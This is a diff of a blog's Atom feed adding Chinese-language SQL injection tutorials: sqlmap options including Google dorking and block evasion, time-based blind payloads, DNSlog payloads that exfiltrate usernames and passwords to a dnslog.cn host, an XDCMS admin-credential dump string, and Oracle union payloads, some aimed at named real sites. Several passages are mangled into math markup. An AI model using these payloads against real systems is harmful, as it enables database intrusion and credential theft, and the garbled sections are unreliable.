+例如：python sqlmap.py -u http://www.target.com/vuln.php?id=1</p>
+<p>参数：-u或者--url<br>
+格式：http(s)😕/targeturl[:port]/[…]<br>
+例如：python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1</p>
+<p>从文本中获取多个目标扫描<br>
+参数：-m<br>
+文件中保存url格式如下，sqlmap会一个一个检测<br>
+www.target1.com/vuln1.php?q=foobar<br>
+www.target2.com/vuln2.asp?id=1<br>
+www.target3.com/vuln3/id/1*</p>
+<p>参数：-r<br>
+sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。</p>
+<p>比如文本文件内如下：</p>
+<p>POST /vuln.php HTTP/1.1<br>
+Host: www.target.com<br>
+User-Agent: Mozilla/4.0<br>
+id=1</p>
+<p>处理google结果<br>
+参数：-g</p>
+<p>sqlmap可以测试注入Google的搜索结果中的GET参数（只获取前100个结果）。</p>
+<p>例子：</p>
+<p>python sqlmap.py -g &quot;inurl:php?id=&quot;</p>
+<p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p>
+<p>例子：</p>
+<p>python sqlmap.py -u “http://www.cracer.com/cracer.php” --data=“id=1”</p>
+<p>--param-del<br>
+参数拆分字符</p>
+<p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p>
+<p>例子：<br>
+python sqlmap.py -u &quot;http://www.cracer.com/vuln.php&quot; --data=&quot;query=foobar;d=1&quot; --param-del=&quot;;&quot;</p>
+<p>cookile<br>
+适用于cookie注入</p>
+<p>将参加加入cookie注入测试<br>
+sqlmap -u &quot;http://www.ntjx.org/jsj/DownloadShow.asp&quot; --cookie &quot;id=9&quot; --table --level 2</p>
+<p>--referer<br>
+sqlmap可以在请求中伪造HTTP中的referer，当--level参数设定为3或者3以上的时候会尝试对referer注入。</p>
+<p>--headers<br>
+可以通过--headers参数来增加额外的http头<br>
+--hearders “client-ip: 1.1.1.1'”</p>
+<p>--proxy<br>
+使用--proxy代理是格式为：http://url:port。<br>
+--proxy=http://127.0.0.1:1080<br>
+--proxy-file c:/1.txt</p>
+<p>时间控制<br>
+--delay<br>
+可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p>
+<p>--timeout<br>
+可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。<br>
+设定重试超时<br>
+--retries</p>
+<p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。<br>
+设定随机改变的参数值</p>
+<p>--safe-url,--safe-freq<br>
+有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p>
+<p>绕过这个策略有两种方式：</p>
+<p>1、--safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。<br>
+2、--safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</p>
+<p>sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p</p>
+<p>参数设置想要测试的参数。例如： -p &quot;id,user-anget&quot;</p>
+<p>有些环境中，需要在注入的payload的前面或者后面加一些字符，来保证payload的正常执行。</p>
+<p>例如，代码中是这样调用数据库的：<br>
+$query = &quot;SELECT * FROM users WHERE id=(’&quot; . <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>[</mo><mi mathvariant="normal">’</mi><mi>i</mi><mi>d</mi><mi mathvariant="normal">’</mi><mo>]</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">’</mi><mo>)</mo><mi>L</mi><mi>I</mi><mi>M</mi><mi>I</mi><mi>T</mi><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mi mathvariant="normal">&quot;</mi><mo separator="true">;</mo><mi mathvariant="normal">这</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">你</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mo>−</mo><mo>−</mo><mi>p</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">和</mi><mo>−</mo><mo>−</mo><mi>s</mi><mi>u</mi><mi>f</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">：</mi><mi>p</mi><mi>y</mi><mi>t</mi><mi>h</mi><mi>o</mi><mi>n</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>p</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>y</mi><mo>−</mo><mi>u</mi><mi mathvariant="normal">&quot;</mi><mi>h</mi><mi>t</mi><mi>t</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mn>192.168.136.131</mn><mi mathvariant="normal">/</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi>m</mi><mi>a</mi><mi>p</mi><mi mathvariant="normal">/</mi><mi>m</mi><mi>y</mi><mi>s</mi><mi>q</mi><mi>l</mi><mi mathvariant="normal">/</mi><mi>g</mi><mi>e</mi><msub><mi>t</mi><mi>s</mi></msub><mi>t</mi><msub><mi>r</mi><mi>b</mi></msub><mi>r</mi><mi>a</mi><mi>c</mi><mi>k</mi><mi>e</mi><mi>t</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>p</mi><mi>h</mi><mi>p</mi><mo>?</mo><mi>i</mi><mi>d</mi><mo>=</mo><mn>1</mn><mi mathvariant="normal">&quot;</mi><mo>−</mo><mi>p</mi><mi>i</mi><mi>d</mi><mo>−</mo><mo>−</mo><mi>p</mi><mi>r</mi><mi>e</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">’</mi><mo>)</mo><mi mathvariant="normal">&quot;</mi><mo>−</mo><mo>−</mo><mi>s</mi><mi>u</mi><mi>f</mi><mi>f</mi><mi>i</mi><mi>x</mi><mi mathvariant="normal">&quot;</mi><mi>A</mi><mi>N</mi><mi>D</mi><mo>(</mo><mi mathvariant="normal">’</mi><mi>a</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">’</mi><mo>=</mo><mi mathvariant="normal">’</mi><mi>a</mi><mi>b</mi><mi>c</mi><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">样</mi><mi mathvariant="normal">执</mi><mi mathvariant="normal">行</mi><mi mathvariant="normal">的</mi><mi>S</mi><mi>Q</mi><mi>L</mi><mi mathvariant="normal">语</mi><mi mathvariant="normal">句</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">：</mi></mrow><annotation encoding="application/x-tex">_GET[’id’] . &quot;’) LIMIT 0, 1&quot;; 
+这时你就需要--prefix和--suffix参数了：
+python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;
+这样执行的SQL语句变成：
+</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord">’</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord">’</span><span class="mclose">]</span><span class="mord">.</span><span class="mord">&quot;</span><span class="mord">’</span><span class="mclose">)</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">M</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">&quot;</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">你</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">和</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">−</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">：</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mord">&quot;</span><span class="mord mathdefault">h</span><span class="mord mathdefault">t</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord">1</span><span class="mord">9</span><span class="mord">2</span><span class="mord">.</span><span class="mord">1</span><span class="mord">6</span><span class="mord">8</span><span class="mord">.</span><span class="mord">1</span><span class="mord">3</span><span class="mord">6</span><span class="mord">.</span><span class="mord">1</span><span class="mord">3</span><span class="mord">1</span><span class="mord">/</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord">/</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mord">.</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">p</span><span class="mclose">?</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord">&quot;</span><span class="mord">’</span><span class="mclose">)</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault">x</span><span class="mord">&quot;</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord">’</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord">’</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">’</span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mord mathdefault">c</span><span class="mord">&quot;</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">执</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">Q</span><span class="mord mathdefault">L</span><span class="mord cjk_fallback">语</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">：</span></span></span></span>query = &quot;SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1&quot;;</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[其他注入漏洞]]></title>
+        <id>https://itxz.fun/post/qi-ta-zhu-ru-lou-dong/</id>
+        <link href="https://itxz.fun/post/qi-ta-zhu-ru-lou-dong/">
+        </link>
+        <updated>2020-09-09T11:59:57.000Z</updated>
+        <content type="html"><![CDATA[<p>PART 1:  各种提交方式注入的挖掘<br>
+常见的提交方式<br>
+GET<br>
+POST<br>
+COOKIE<br>
+HEAD<br>
+PUT<br>
+OPTION<br>
+GET注入<br>
+get注入比较常见<br>
+例如：<br>
+www.cracer.com/new.asp?id=11&amp;ssid=123&amp;bid=55<br>
+And 1=1<br>
+And 1=2<br>
+/ -0<br>
+‘    %bf’</p>
+<p>POST注入<br>
+post提交方式主要适用于表单的提交<br>
+可能存在漏洞的位置：<br>
+搜索框、登录、留言、注册<br>
+挖掘的时候注入魔术引号<br>
+例如：<br>
+www.cracer.com/admin.php<br>
+测试站点：<br>
+http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=<br>
+测试工具<br>
+pangolin  sqlmap<br>
+Xdcms +burp注入</p>
+<p>“<br>
+XDCMS全版本存在sql注入漏洞</p>
+<p>需要使用代理抓包改包工具进行完成。</p>
+<p>sql exp<br>
+%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23</p>
+<p>POST注入利用工具</p>
+<p>pangolin<br>
+sqlmap<br>
+sqlmap -u  http://testasp.vulnweb.com/login.asp --data &quot;tfUPass=1&amp;tfUName=1&quot;<br>
+POST 手工</p>
+<p>http头注入<br>
+x-forwarded-for.  1.1.1.1<br>
+client-ip 1.1.1.1<br>
+referrer</p>
+<p>安全性比较高的站点<br>
+会记录你ip的网站可能存在<br>
+投资理财<br>
+资金盘 记录ip<br>
+留言<br>
+贴吧</p>
+<p>用户上传<br>
+xss居多</p>
+<p>伪静态注入<br>
+http://zcb.sxjgjt.com.cn/<br>
+http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131.html<br>
+http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131<br>
+www.cracer.com/xxx_html_id+123<br>
+Cracer.com/sfcxdf/sfsdfs/?445.html<br>
+Aspcms<br>
+phpweb</p>
+<p>PART 3:  延迟注入漏洞</p>
+<p>延迟注入<br>
+延时注入是通过页面返回的时间来判断的<br>
+不同的mysql数据库版本，延迟注入语句也不同<br>
+mysql &gt;=5.0  的可以使用sleep()进行查询<br>
+mysql&lt;5.0  的可以使用benchmark()进行查询<br>
+benchmark用法<br>
+benchmark(n,sql语句)  n为查询次数<br>
+通过查询次数增多 时间变得缓慢来判断是否存在延迟<br>
+select benchmark(1000,select * from admin) ;</p>
+<p>延迟注入<br>
+sleep()延迟注入用法<br>
+sleep 可以强制产生一个固定的延迟。<br>
+sleep()延迟注入核心原理<br>
+and if(true,sleep(5),0); ==IF(1=1, true, false);<br>
+id=1 and sleep(5)  判断下是否存在延迟注入<br>
+and if(substring(user(),1,4)='root',sleep(5),1) 判断当前用户<br>
+and if(MID(version(),1,1) LIKE 5, sleep(5), 1)  判断数据库版本信息是否为5<br>
+可以去猜解他的数据库名称<br>
+and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1)<br>
+and If(ascii(substr(database(),1,1))&lt;115,sleep(10),1)--+<br>
+and If(length((version()))=6,sleep(10),1)--+<br>
+sqlmap --time-sec=2  延迟注入<br>
+手工时间盲注<br>
+https://blog.csdn.net/DarkHQ/article/details/79274376</p>
+<p>dnslog 注入<br>
+dnslog 平台会记录域名dns查询记录，通过我们把查询的结果和dns子域名拼接，发送给dnslog平台查询，就会记录我们的语句查询结果，从而快速提升延迟注入速度。<br>
+条件：<br>
+root权限（要借助load_file()函数）</p>
+<p>dns注入列列名<br>
+列列名<br>
+and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+<br>
+and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' and TABLE_SCHEMA='dbname' limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
+<p>第二个列名<br>
+and if((select load_file(concat('\\',(select column_name from information_schema.columns where table_name='user' limit 1,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
+<p>dns注入列数据<br>
+列数据<br>
+and if((select load_file(concat('\\',(select username from user limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+</p>
+<p>and if((select load_file(concat('\\',(select password from user limit 0,1),'.7dluss.dnslog.cn\abc'))),1,1)--+<br>
+PART 4:  BASE64编码注入漏洞<br>
+base64编码注入<br>
+解码<br>
+构造语句<br>
+编码<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mo>=</mo><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>6</mn><msub><mn>4</mn><mi>d</mi></msub><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">id=base64_decode(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord">6</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>id);</p>
+<p>app注入挖掘<br>
+利用抓包工具获取app发送到服务器的链接<br>
+burp fiddler即可<br>
+得到链接进行测试</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[oracle注入]]></title>
+        <id>https://itxz.fun/post/oracle-zhu-ru/</id>
+        <link href="https://itxz.fun/post/oracle-zhu-ru/">
+        </link>
+        <updated>2020-09-08T13:26:04.000Z</updated>
+        <content type="html"><![CDATA[<p>oracle<br>
+db2<br>
+适用与比较大的站点</p>
+<p>政府机关站点<br>
+大学<br>
+金融 证券<br>
+旅游站点</p>
+<p>jsp+oracle 存在注入</p>
+<p>手工<br>
+几十张表<br>
+bool盲注<br>
+ascii<br>
+工具跑<br>
+/<br>
+-0<br>
+and 1=1<br>
+and 1=2<br>
+asp/aspx/jsp+oracle</p>
+<p>oracle数据库介绍<br>
+Oracle数据库系统是美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品。是目前世界上使用最为广泛的数据库管理系统。基于“客户端/服务器”模式结构，客户端应用程序与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数据信息和各种操作数据的活动。<br>
+特点<br>
+    1 支持多用户、大事务量的处理<br>
+    2 数据安全性和完整性的有效控制<br>
+    3 支持分布式数据处理<br>
+    4 移植性强</p>
+<p>判断数据库<br>
+判断注入<br>
+and 1=1<br>
+and 1=2<br>
+判断oracle数据库<br>
+and exists(select * from dual)<br>
+and exists(select * from user_tables)</p>
+<p>判断列数<br>
+order by 11   返回正常<br>
+order by 12    返回错误<br>
+union select null，null，null，null，null</p>
+<p>获取数据类型不匹配的列<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,null,null,null,null,null,null,null,null,null,null from dual</p>
+<p>获取数据类型不匹配的列<br>
+在每列上逐个用数字代替 如果返回正常说明该列为数字类型，反之则为非数字类型。<br>
+也可以逐个用引号引起来如：'null',null...from dual, 返回正常说明该列为字符类型，反之为非数字类型</p>
+<p>获取基本信息<br>
+获取数据库版本<br>
+(select banner from sys.v_<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mi>e</mi><mi>r</mi><mi>s</mi><mi>i</mi><mi>o</mi><mi>n</mi><mi>w</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>e</mi><mi>r</mi><mi>o</mi><mi>w</mi><mi>n</mi><mi>u</mi><mi>m</mi><mo>=</mo><mn>1</mn><mo>)</mo><mi mathvariant="normal">获</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">操</mi><mi mathvariant="normal">作</mi><mi mathvariant="normal">系</mi><mi mathvariant="normal">统</mi><mi mathvariant="normal">版</mi><mi mathvariant="normal">本</mi><mo>(</mo><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>m</mi><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>r</mi><mi>f</mi><mi>r</mi><mi>o</mi><mi>m</mi><mi>v</mi></mrow><annotation encoding="application/x-tex">version where rownum=1)
+获取操作系统版本
+( select member from v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">操</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">统</span><span class="mord cjk_fallback">版</span><span class="mord cjk_fallback">本</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span></span></span></span>logfile where rownum=1)<br>
+获取连接数据库的当前用户<br>
+( select SYS_CONTEXT ('USERENV','CURRENT_USER')from dual)<br>
+获取数据库<br>
+(select owner from all_tables where rownum=1)</p>
+<p>获取数据库版本<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<p>获取操作系统版本<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select member from v$logfile where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<p>获取连接数据库的当前用户<br>
+http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,( select SYS_CONTEXT ('USERENV','CURRENT_USER')from dual),null,null,null,null,null,null,null,null,null from dual</p>
+<p>order by  10</p>
+<p>union select 1,2',ull,null,null</p>
+<p>admin<br>
+JSSLEDU_MANGER_SYSTEMM</p>
+<p>sqlmap.py - u  &quot;url&quot; ---current -db 列数据库<br>
+sqlmap.py -u &quot;url&quot; -D xxx  --tables 指定数据库列表名<br>
+sqlmap.py -u &quot;url&quot; --current -</p>
+<p>sqlmap<br>
+默认模糊匹配</p>
+<p>google语法<br>
+inurl：php？id=site.jp 商品名称 转换成日语</p>
+<p>mysql root 在windows 权限最高<br>
+在linux只是服务用户权限<br>
+postgresql postgres 具有写入根目录权限<br>
+user-agent：sqlmap.org</p>
+<p>--random -agent<br>
+用户上传<br>
+xss居多<br>
+sql注入<br>
+burp抓包分析请求查找</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[mysql注入]]></title>
         <id>https://itxz.fun/post/mysql-zhu-ru/</id>
@@ -1587,761 +2522,6 @@ if i == '好':<br>
 break</p>
 <h1 id="break-continue">break continue</h1>
 <h1 id="for-else-while-else用法一样">for else: while else:用法一样。</h1>
-]]></content>
